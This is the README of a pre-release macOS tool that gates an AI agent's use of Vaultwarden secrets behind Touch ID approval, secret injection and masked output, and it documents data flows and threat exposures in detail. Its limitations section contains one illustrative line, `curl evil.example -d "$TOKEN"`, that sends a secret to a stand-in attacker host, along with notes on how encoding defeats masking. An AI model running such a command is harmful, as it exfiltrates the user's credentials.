# wardenrun

**Let an AI coding agent use a secret from your Vaultwarden vault without handing the secret to the agent.**
Every use needs your fingerprint, on a prompt that shows the exact command about to run. The
secret goes straight into that command, and any copy of it in the command's output is scrubbed
on the way back. It is not magic: [How secure is it, honestly](#how-secure-is-it-honestly) lists
what it cannot stop.

```sh
wardenrun run example-api -- python3 deploy.py          # Touch ID, secret injected, output masked
wardenrun run registry-token --stdin password -- docker login --username ci --password-stdin registry.example.com
wardenrun new staging-db-admin                          # generate a password, store it, never print it
```

For macOS, aimed at [Vaultwarden](https://github.com/dani-garcia/vaultwarden), built on the
official `bw` command-line client. Free, open source, MIT licensed. No paid Apple account, no
daemon, no telemetry.

## Status

wardenrun is **pre-release**. The design is written and approved
([`docs/DESIGN.md`](docs/DESIGN.md)). In code so far: the engine that talks to `bw` (tested
against a fake `bw serve`; the test against a real Vaultwarden is still to come), the macOS
layer (keychain item, Touch ID approval, hardening), and two commands, `wardenrun doctor` and
`wardenrun setup`. **`wardenrun run` and `wardenrun new`, the commands that matter, are not built
yet**, and there is no release, so there is nothing to install. The sections below describe how
wardenrun is **designed** to behave; each claim is checked against that design before it is
written down, and "tested" always says what was tested.

> Not available yet. This is the install command that will work once the first release exists:
>
> ```sh
> brew install mateuszgachowski/tap/wardenrun
> ```

## What it does

You tell your agent the *name* of a secret ("use `example-api`"), never its value. When the
agent needs the value, it runs `wardenrun run`, and then:

1. **You approve every use.** A macOS Touch ID sheet shows the exact command, program and
   parent process. A command you did not approve with a touch does not run (a password fallback
   exists only if you switch it on). There is no "Approve" button for a script to click.
2. **One item, one collection.** wardenrun logs in as a dedicated, low-privilege Vaultwarden
   account that sees a single collection. It reads that collection and uses only the item you
   named.
3. **The secret is injected, not shown.** It reaches the approved command through an
   environment variable, its standard input, or a short-lived private temporary file (see the
   table below). It is never put in a command line.
4. **Output is masked.** Copies of the secret in the command's output (as is, base64, hex,
   URL-encoded and a few more forms) are replaced with `[REDACTED:example-api]` before the agent
   sees it. This catches accidents, not a command written to leak; see "How secure is it,
   honestly".
5. **No unlocked vault is left behind.** Each run unlocks, fetches, locks again, and exits.
   There is no background process and no socket the agent could talk to.
6. **`wardenrun new <name>` creates secrets the agent never sees.** It generates a strong
   password, stores it in the vault, and prints only the item's name, id and collection.
7. **Everything is logged, without values.** One line per decision in a local audit log:
   what was asked, by what, and whether you said yes.

### Choosing how the secret reaches the command

| You write | What happens | Can another process of your user see it? |
|-----------|--------------|-------------------------------------------|
| nothing | Custom fields named `env:VAR` on the vault item become environment variables `VAR` (the item itself says which variables it provides) | Yes, with `ps eww`, while the command runs |
| `--env VAR=field` | The item's `field` becomes the environment variable `VAR` | Same |
| `--file VAR=field` | `field` is written to a private `0600` temporary file; `VAR` holds its path; the file is deleted on exit | Readable by your user while the file exists |
| `--stdin field` | `field` is written to the command's standard input | No |

`field` is `password`, `username`, `totp`, `notes`, `uri`, or the name of a custom field. The
default (first row) is the least private option; prefer `--stdin` when the tool allows it.

## How the data flows

This is one `wardenrun run`. Every arrow is numbered; the table underneath says what travels on
each one, how, and whether another process of your macOS user could watch it.

```text
  AI agent  (a shell command, running as the same macOS user as you)
      │
      │ (1) command line:  wardenrun run example-api -- python3 deploy.py
      ▼
┌─ wardenrun: one short-lived process, no daemon ────────────────────────────┐
│                                                                            │
│ (2) the exact command ──────────────▶  macOS Touch ID sheet                │
│     ◀───────────── yes or no ───────   (you, at the screen)                │
│                                                                            │
│ (3) master password + settings ◀────   macOS keychain                      │
│                                        (one item, opens only for           │
│                                         wardenrun's signature)             │
│                                                                            │
│ (4) master password ──▶  bw  ◀──(5) HTTPS──▶  Vaultwarden                  │
│ (6) collection's items ◀─┘ (official CLI)     (your server)                │
│                                                                            │
│     the secret is now in wardenrun's memory (bw held it only briefly)      │
│                                                                            │
│     then bw is told to lock, and the password is zeroed                    │
│                                                                            │
└────────────────────────────────────────────────────────────────────────────┘
      │ (7) secret handed to the approved command: environment variable,
      │     stdin, or a private 0600 temporary file
      ▼
  child process  (python3 deploy.py)
      │ (8) stdout + stderr
      ▼
  wardenrun's masker: every copy of the secret becomes [REDACTED:example-api]
      │
      ▼
  AI agent sees only the masked output

  (9) meanwhile: one audit-log line (names and your decision, never values)
```

| # | What travels | How it travels | Can another process of your user see it? |
|---|--------------|----------------|-------------------------------------------|
| 1 | The command line the agent wants to run | Normal command-line arguments (`argv`) of the `wardenrun` process | Yes, and it does not matter: the agent wrote it. It contains item *names*, never values. |
| 2 | The approval text: the program, its arguments and the parent process | Shown by macOS itself in the Touch ID sheet. At most 400 characters; a longer command is **denied**, never shortened. | No. It is drawn on your screen. Only a yes or a no comes back, from the OS. |
| 3 | The master password of the dedicated account, plus settings (server address, collection, pinned `bw`) | Read from one macOS keychain item into wardenrun's memory | Not the item: macOS opens it only for programs signed with wardenrun's certificate (tested with a prototype). After the read it lives in wardenrun's locked, zeroed-after-use memory. |
| 4 | The master password, on its way to `bw` (and, depending on the path, a session key back) | Three paths, best first. **(a) Preferred:** a private socket shared only by wardenrun and one `bw serve` process; neither the password nor a session key is ever in an environment or a command line. **(b) Fallback:** the password through a pipe, then the session key `BW_SESSION` in the environment of each `bw` call. **(c) Last resort:** the password itself in `bw`'s environment. An experiment at the start of the `bw` work chooses the path, and this README will say which one shipped. | (a): no. (b) and (c): yes, with `ps eww`, for a few seconds: the session key (b) or the master password (c). Either one unlocks the whole collection (threat model, row 16). |
| 5 | `bw` talking to your Vaultwarden server | HTTPS only. The master password itself is not sent: `bw` derives keys from it on your Mac, and Bitwarden's standard login sends only a derived hash. `bw` keeps its login tokens and an encrypted copy of the vault in wardenrun's own profile directory. | The traffic: no. The profile files: yes, they are readable by your user (threat model, row 17). |
| 6 | The items `bw` lists, as JSON: the whole organization as the dedicated account sees it (`bw` combines its collection and organization filters with OR, so it cannot narrow the list to one collection; that is why the account should only see the one collection). wardenrun picks the item you named, checks it is in the allowed collection, and drops the rest. Then `bw` locks the vault and the password is zeroed. | A pipe from `bw` to wardenrun, into wardenrun's memory only | No |
| 7 | The secret value, handed to the approved command | `--env`: an environment variable (**visible to `ps eww` while the command runs**). `--stdin`: standard input (not visible). `--file`: a `0600` file in a private temp directory (readable by you while it exists, deleted on exit). | `--stdin`: no. `--env` and `--file`: yes, while the command runs. That is why `--stdin` exists. |
| 8 | What the command prints, going back to the agent | The command's stdout and stderr go through wardenrun's masker, then on to the agent | Only masked stdout and stderr pass through wardenrun. A command that writes the secret to a file, or encodes it in a way the masker does not recognise, is not caught (threat model, row 8). |
| 9 | One audit-log line | Appended to a local file | Yes, it is a normal file. It holds names, the command line, hashes, times and your decision, never values. |

`wardenrun new` follows the same path, with a different payload. The new password only ever
exists in wardenrun's memory and in pipes between wardenrun and `bw`; the exposures of steps 4
and 5 above apply to it as well.

```text
  you or the agent:   wardenrun new staging-db-admin
      │
      ▼
  (a) wardenrun generates the password itself, from macOS secure random,
      in its own memory
  (b) Touch ID sheet: 'create item "staging-db-admin" in collection <name>,
      password of 32 characters, never shown'          you approve with a touch
  (c) master password from the keychain ──▶ bw ──▶ Vaultwarden: unlock,
      sync, check the name is free  (same path as steps 3 to 6 above)
  (d) the new item goes to bw as JSON, over a pipe or the private socket, never
      in a command line ──▶ Vaultwarden (HTTPS)
  (e) bw answers with the new item, password included, over a pipe;
      wardenrun keeps only the id and zeroes the rest
  (f) what the caller sees:   created "staging-db-admin" (id ...) in <collection>
      the password is never printed, logged or returned
```

And `wardenrun setup`, once, with a human at the keyboard. The master password is typed into
wardenrun and goes nowhere except the places on this page:

```text
  you, at the terminal:  server, e-mail, organization id, collection ids
                         master password (typed hidden, never echoed)
      │
      ▼
  (a) wardenrun holds the password in locked memory; nothing is written yet
  (b) Touch ID sheet: the new settings beside the old ones, NEVER the password
      ──▶ you approve with a touch  (no touch, no change)
  (c) the official bw is copied to ~/.config/wardenrun/bin/bw (folder 0700);
      the copy's signature is checked against Bitwarden's before it is used
  (d) password ──▶ `bw login` through an inherited pipe (/dev/fd/3): not in an
      argument, not in an environment variable, not in a file
      bw ◀──HTTPS──▶ Vaultwarden, leaves login tokens in a STAGED bw folder
  (e) proof: bw serve unlocks with the password and locks again, nothing read
  (f) only now: the staged bw folder replaces the working one, and
      settings + password ──▶ the one keychain item
      (a failure at (c), (d) or (e) leaves the keychain item and the working
      bw folder as they were; the staged folder is deleted)
  (g) one audit-log line: "setup", no values
```

| Step | What travels | Can another process of your user see it? |
|------|--------------|-------------------------------------------|
| typing | The password, keystroke by keystroke, into a locked buffer: no `String`, no echo | No (the terminal itself is outside wardenrun's control) |
| (b) | Old and new settings in the sheet text | No, it is drawn by macOS. Only a yes or a no comes back. |
| (d) | The password and a newline, through a pipe that only `bw login` inherits | No, with the same caveat as step 4 of `run`: pipe buffers in the kernel are outside what wardenrun can zero |
| (c) | A copy of `bw`; before every later use the process that actually runs is checked against Bitwarden's signature again | A same-user program can replace the copy; the live check refuses and kills a `bw` that is not Bitwarden's. It does not catch an older, genuinely Bitwarden-signed `bw`. |
| (f) | Settings and password into the keychain item | Not by programs with a different signature |

### Words used above

- **`argv`**: the command line of a program. Other processes of your user can read it.
- **Environment**: the variables a program is started with. Other processes of your user can read
  them with `ps eww` while the program runs.
- **Session key (`BW_SESSION`)**: the key `bw` uses to read an unlocked vault. Whoever has it, plus
  `bw`'s profile files, can decrypt the cached vault.
- **Keychain item**: one entry in the macOS login keychain. Here, an entry that only wardenrun's
  signed program can open.
- **Hardened runtime**: a macOS code-signing mode that blocks the usual ways of injecting code
  into a program.
- **`0600` / `0700`**: file permissions meaning "readable only by you".
- **Hash-chained log**: each line carries the hash of the previous line. That catches accidents
  and clumsy edits; a process of yours that knows the format can still rewrite or cut the log.

### One-time setup

Before the first `run`, a human does this once:

1. In your Vaultwarden clients, create the dedicated account, put it in one organization, and
   give it one collection holding the secrets the agent may use.
2. Install the **official `bw` release** (the signed binary from Bitwarden's GitHub releases;
   not the Homebrew or npm build, which is a Node script that loads code from folders wardenrun
   cannot vouch for). Note its path.
3. Find the ids `setup` asks for: the organization id and the collection id(s). They are
   printed by `bw list organizations` and `bw list collections` for the dedicated account. Do
   that in a throwaway profile, never in your personal one:

   ```sh
   export BITWARDENCLI_APPDATA_DIR="$(mktemp -d)"   # a throwaway bw profile
   bw config server https://vault.example
   bw login dedicated@example.test                  # asks for the password
   export BW_SESSION="$(bw unlock --raw)"
   bw list organizations                            # "id" is the organization id
   bw list collections                              # "id" of the collection(s), with "organizationId"
   bw logout; unset BW_SESSION; rm -rf "$BITWARDENCLI_APPDATA_DIR"
   ```

   These are documented `bw` commands; running them against a real Vaultwarden is part of the
   integration tests that are still to come.
4. Run `wardenrun setup` (add `--bw /path/to/bw` if `bw` is not on your `PATH`) in a terminal.
   It asks for the server address, the account e-mail, the organization id and the collection
   id(s), then for the master password, which **you type at the terminal, hidden**. It never
   takes a password as an argument, from a pipe or from a file.
5. A Touch ID sheet shows the new settings (server, account, organization, collections, the
   `bw` program) next to the old ones, and never the password. Nothing has changed up to this
   point. If you refuse, nothing changes at all.
6. After your touch, `setup` copies `bw` into wardenrun's own folder
   (`~/.config/wardenrun/bin/bw`, a folder with mode `0700`) **after checking the copy's
   signature against Bitwarden's**. Another program of yours can still replace that copy
   later, which is why the process that is actually running is checked against Bitwarden's
   signature again before `bw` gets its first instruction, on every use (a wrong one is killed); logs that copy in to your server with the password
   (over an inherited pipe: not in an argument, not in an environment variable, not in a file)
   into a **staged** profile folder next to the real one; unlocks and locks once to prove that
   the password and the account belong together; and **only then** swaps the staged profile
   in and writes the keychain item. If any step fails, the keychain item **and** the working
   `bw` profile are untouched and the staged folder is deleted: run `setup` again.

   The dedicated account must be able to log in with the password alone: an account with
   two-step login is not supported yet. wardenrun makes no network call of its own, so it also
   does not check whether Bitwarden has revoked its signing certificate.

From then on the master password travels only as in steps 3 and 4 above.

Changing the settings later is the same command: it shows the old values as the defaults and in
the approval sheet, and still needs the password typed again.

### Checking the installation

`wardenrun doctor` is read-only and prints one line per check, never a secret. Its exit code is 1
if any line says `FAIL`, 0 otherwise (a `warn` does not fail it). The checks:

| Line | What it tells you |
|------|-------------------|
| `tier` | The protection level in one sentence: the keychain item opens only for wardenrun's signature; the Touch ID gate is wardenrun's own code, not macOS's |
| `deny-attach`, `core-dumps`, `dyld-environment` | Debugger attach is denied, core dumps are off, no `DYLD_*` variable is set |
| `hardened-runtime` | The binary is signed with the hardened runtime (`warn` for an unsigned build, `FAIL` for a signed one without it) |
| `graphic-session` | There is a screen session to show the Touch ID sheet on (no sheet over ssh or cron) |
| `certificate` | Who signed this binary (compare with the hash published at release) |
| `touch-id` | Touch ID can be used right now (`ok`), or the reason it cannot (`FAIL`) |
| `protected-item` | The keychain item is readable by this binary (`ok`, with the number of collections), does not exist yet (`info`) or cannot be read (`FAIL`: another signer, or damaged) |
| `bw-pin`, `bw-version`, `bw-profile` | The pinned `bw` still carries Bitwarden's signature (`FAIL` if not); its version, marked `untested` unless it is the one wardenrun was developed against (2026.10.x); whether wardenrun's own `bw` profile exists yet. Reading the version starts `bw` once: no vault, no network. |

## What wardenrun can reach, and what it cannot

| wardenrun **can** reach | wardenrun **cannot** reach, and does not |
|-------------------------|-------------------------------------------|
| Its own keychain item (the dedicated account's master password and settings) | Your personal vault, and any collection or organization the dedicated account is not in |
| The one collection of the dedicated Vaultwarden account | Any other keychain item: passwords, certificates, keys of other apps |
| The command line, stdout and stderr of the command it launches | Your fingerprint. The OS only ever answers "yes" or "no". |
| The names of the parent processes (to show you who asked) | The agent's conversation, prompts or files (it only sees the command it is asked to run) |
| Its own state folder and audit log | Any network host except your Vaultwarden server, and then only through `bw`. wardenrun itself makes no network calls: no telemetry, no update check, no cloud service. |

The same boundary, from the agent's side:

| The agent **never gets** (by design) | The agent **can still see** |
|---------------------------------------|------------------------------|
| A secret value for a command you did not approve (the exceptions are threat model rows 7, 16 and 17) | The masked output of any command it runs through wardenrun (masking is an accident guard, not a barrier) |
| The master password and a session key, on the preferred path of step 4 | The command it asked for, since it wrote it |
| Your personal vault or any other collection | The secret of an approved command while it runs: its environment with `--env`, its temporary file with `--file` (step 7) |
| A way to click "Approve" on your behalf | On the fallback paths of step 4: the session key or the master password, for a few seconds |
| | The audit log, and the `bw` profile files in wardenrun's folder (login tokens in plain text; as far as is known, an encrypted copy of the vault) |

The last three rows on the right are real exposures, not footnotes. They are the reason for the
dedicated account and the advice below.

## Where your data lives

| Where | What is in it | How long |
|-------|---------------|----------|
| **One macOS login-keychain item** | The master password of the dedicated account, the server address, the account name, the organization and allowed collection, and the identity of the `bw` program wardenrun trusts. Only programs signed with wardenrun's certificate can read it. It is written last by `setup`, after the login worked. Saving over an existing item deletes it and writes a new one, so an item someone else planted with a looser access list is never reused; macOS may then ask for your login-keychain password once. Answer only a dialog you started. | Until you remove it or run `wardenrun setup` again |
| **`~/.config/wardenrun/bin/bw`** | A copy of the official `bw` release, made by `setup` after its signature was checked (and checked again at that path). The folder is mode `0700`. It is code, not a secret. | Until you delete it or run `setup` again |
| **`~/.config/wardenrun/state/`**, **`bw.lock`** | Files for the approval limit (one sheet at a time; a short lock-out after repeated refusals: times of recent refusals, no names) and the lock that keeps two wardenruns from using `bw` at once. | Until you delete them. Deleting them also lifts the lock-out: this limit slows a pestering agent, it is not a barrier against one that can delete files. |
| **`~/.config/wardenrun/bw/`** | wardenrun's *own* `bw` profile: login tokens (**plain text**, mode `0600`; plus the API-key secret if you logged in with one) and, as far as is known, an encrypted copy of the vault and the wrapped vault key. Never your personal `bw` profile. | Until you delete it. An option logs out after every run. |
| **`~/.config/wardenrun/config.toml`** | Not built yet; nothing reads it. It is reserved for preferences only (approval timeout, redaction text, log path); nothing in it will be able to widen access. | |
| **`~/Library/Logs/wardenrun/audit.jsonl`** | One line per event: time, event (approved, denied, timeout, error, new, setup), item *name*, command line (any secret masked), program path and hash, working directory, parent processes, protection level, exit status, duration. Lines are hash-chained, which catches accidents and clumsy edits, not a determined rewrite by a process of yours. **Never values.** | Until you delete it |
| **A temporary file** | Only with `--file`: a `0600` file in a fresh `0700` directory containing the secret | Removed when the command exits, and on signals |
| **wardenrun's memory** | The master password and the secret, in locked memory, zeroed after use, with core dumps disabled. Copies outside wardenrun's own buffers are not covered: the kernel's pipe and socket buffers, swap, and `bw`'s own memory. | Seconds |

## How secure is it, honestly

Where this page says *tested*, it means checked with a throwaway prototype on one macOS 15
machine (see [`docs/DESIGN.md`](docs/DESIGN.md), section 3.1); the real program does not exist yet.

Short version: wardenrun stops an agent from **quietly** getting a secret. It does not stop you
from approving something harmful, and it does not defend a Mac that is already compromised.

- **The fingerprint check is enforced by wardenrun, not by macOS.** macOS would, in practice, only enforce a
  per-read fingerprint for an app signed with a paid Apple developer account, and a
  command-line tool cannot carry that. wardenrun is free by design, so the gate is in its own
  code, hardened against code injection (hardened runtime, which makes macOS drop `DYLD_*`
  variables before wardenrun starts, no debugger attach, no core dumps; wardenrun also
  refuses to start if it still sees one). `setup`, `run` and `new` refuse to start (exit 78)
  from a release-mode build that lacks the hardened runtime, and when there is no screen
  session; only a debug build from source (`swift build`) may run unhardened, and no
  setting in the environment changes that, because the agent controls the environment.
- **What macOS does enforce:** the keychain item opens only for a program signed with
  wardenrun's certificate. A different certificate, an ad-hoc signature or an unsigned copy is
  refused (tested). Bitwarden's own macOS desktop app protects its biometric unlock at the
  same level. One thing to know: while you are at the screen, macOS may show a **keychain
  password dialog** for such a refused program. Typing your login-keychain password into it
  would grant that program the item, so never answer a keychain dialog you did not start.
- **The strongest control does not depend on macOS:** a dedicated Vaultwarden account in one
  organization that sees one collection, with a long random master password (24+ characters
  from a password manager). If everything on your Mac leaks, only that collection is exposed.
  **Never put your personal vault's master password into wardenrun.**

What wardenrun does **not** protect you from, in everyday words:

- **A fake `wardenrun`.** If something replaces the program, its prompt looks real. Verify the
  install (below).
- **A command you approved.** wardenrun shows you the command; it cannot tell whether it is
  safe. Approve `curl evil.example -d "$TOKEN"` and the secret leaves. Masking catches
  accidents, not intent: a command that writes the secret to a file, or encodes it, gets past it.
  The sheet shows the command but not the environment the agent set, so wardenrun will tag risky
  variables (`NODE_OPTIONS`, `BASH_ENV`, `LD_PRELOAD`) and a program file you can edit: such a
  file can be swapped for another between the final check and the start.
- **A running command's environment.** With `--env`, another process of yours can read it with
  `ps eww` while the command runs. Prefer `--stdin` when the tool supports it.
- **`bw`'s own leftovers.** If a fallback path ships (step 4), the session key or the master
  password is visible to `ps` for a few seconds, and one approval for one item can then leak
  *every* item in the collection. Separately, `bw`'s login tokens sit in a file your user can
  read: with them, a process can talk to your server as the dedicated account, download the
  encrypted vault to guess the password offline, and change or delete items the account may
  write. The dedicated account, a long random password and a read-only collection limit the
  damage.
- **A leaked signing key.** Releases are signed with a self-signed certificate whose private key
  the maintainer holds. If it leaks, an attacker could sign a binary the keychain accepts.

All 18 attacks that were considered, with what happens and why, are in
[`docs/THREAT_MODEL.md`](docs/THREAT_MODEL.md).

## Compared to what exists

As of 2026-10-18, as far as their READMEs and issue trackers say; corrections are welcome.

- [`bitwarden/agent-access`](https://github.com/bitwarden/agent-access) (`aac`) is Bitwarden's
  official project for giving agents credentials. It is pre-1.0 (latest release v0.11.0,
  2026-03-21). Approval happens in a terminal UI rather than through Touch ID, and its open
  issues include approval prompts that queue silently (#139) and no headless mode (#147).
- [`jeanregisser/bitwarden-cli-bio`](https://github.com/jeanregisser/bitwarden-cli-bio) unlocks
  `bw` with biometrics through the Bitwarden desktop app. It handles unlocking only: there is
  no per-use approval and no secret injection.
- [`vforsh/bwx`](https://github.com/vforsh/bwx), [`JulienJBO/bwenv`](https://github.com/JulienJBO/bwenv)
  and [`haydonryan/vaultwarden-cli`](https://github.com/haydonryan/vaultwarden-cli) inject
  secrets into environment variables, but have no per-use biometric approval and no output
  masking. `bwx` keeps the master password in the macOS Keychain and unlocks automatically, so
  an agent can use it without asking.
- [`bitwarden/mcp-server`](https://github.com/bitwarden/mcp-server) lets a model read your
  vault. That returns secrets to the model, the opposite of what wardenrun is for.

wardenrun's niche: **per-use approval that shows the real command, injection instead of
disclosure, masked output, and a vault account whose reach you have limited on purpose**, for
Vaultwarden users on macOS.

## Verify, don't trust

A secrets tool should be easy to audit. The design gives you these checks:

- **No network calls of its own.** wardenrun contacts nothing; only `bw` talks to your
  Vaultwarden server. You can confirm it with a network monitor of your choice.
- **`wardenrun doctor`** prints which protection level is active, the signature flags, the
  hardening status, whether the pinned `bw` still matches, whether the keychain item is
  readable and the `bw` version (see "Checking the installation"). It never prints a secret. It
  makes no network call, so it does not check the Vaultwarden version.
- **The signing certificate hash** will be published here and in [`SECURITY.md`](SECURITY.md)
  with the first release. Check your install with `codesign -d -r- "$(command -v wardenrun)"`:
  the requirement it prints must contain that hash. A different hash means a different signer.
- **The audit log** is plain JSON lines: `tail -n 5 ~/Library/Logs/wardenrun/audit.jsonl`.
- **The security-critical code is small and separated.** The platform-neutral core (masking,
  the `bw` driver, environment handling) lives in `Sources/WardenrunCore/`; the macOS parts
  (keychain store, Touch ID approval, hardening) in `Sources/WardenrunMac/`.
  Read those two directories and you have read the part that matters.

## Use with Claude Code and other AI agents

The agent only needs item *names* and one rule. A snippet for your `CLAUDE.md` or agent
instructions:

```text
Secrets: never ask for, print or write secret values. To use one, run
`wardenrun run <item> -- <command>` and wait for the human to approve with Touch ID.
If wardenrun exits with code 77 the human said no (or did not answer): stop and ask.
Keep the command short (under 400 characters); put anything longer in a script file.
Prefer `--stdin <field>` when the tool can read the secret from standard input.
```

Things worth knowing:

- **A refusal or a timeout (60 seconds) is exit code 77.** After repeated refusals wardenrun
  also locks itself out for 60 seconds.
- **Long commands are denied, not shortened.** The macOS sheet silently cuts long text after
  about 510 characters, which would hide the tail of a command. wardenrun budgets 400
  characters and refuses anything longer: put it in a script file.
- **Expect a few seconds of delay per approved run** (roughly 5 to 12 seconds of `bw` work).
  Part of it is wardenrun checking `bw`'s code signature before every start, on purpose: it
  took about 4 seconds on one Intel Mac (measured with the real signed `bw`). A cache for that
  check would have to live outside the protected item, where an agent could forge it, so there
  is none.
- **Use the dedicated account.** Create a Vaultwarden account just for this, put it in one
  organization with one collection, and give it read-only access unless the agent needs `new`.

## Requirements

- A Mac with Touch ID: a built-in sensor, or a Magic Keyboard with Touch ID on an Apple Silicon desktop Mac.
- The official Bitwarden CLI, `bw` **2026.9.0 or newer**, which needs **Vaultwarden 1.37.4 or
  newer**. Older `bw` versions break against that Vaultwarden. It must be the **signed binary
  from Bitwarden's GitHub releases**: the Homebrew and npm builds are Node scripts that load
  code from folders no pin covers, and wardenrun refuses them.
- Swift 6.0 or newer, to build from source while there is no release.
- A Vaultwarden server reachable over **HTTPS** (`bw` refuses plain `http://`).
- A dedicated Vaultwarden account in an organization, with one collection.
- No Apple developer account.

## Not affiliated with Bitwarden

wardenrun is an independent project. It is not made, endorsed or supported by Bitwarden, Inc.
or by the Vaultwarden project; it drives the official `bw` command-line client and names
Vaultwarden only to say what it works with.
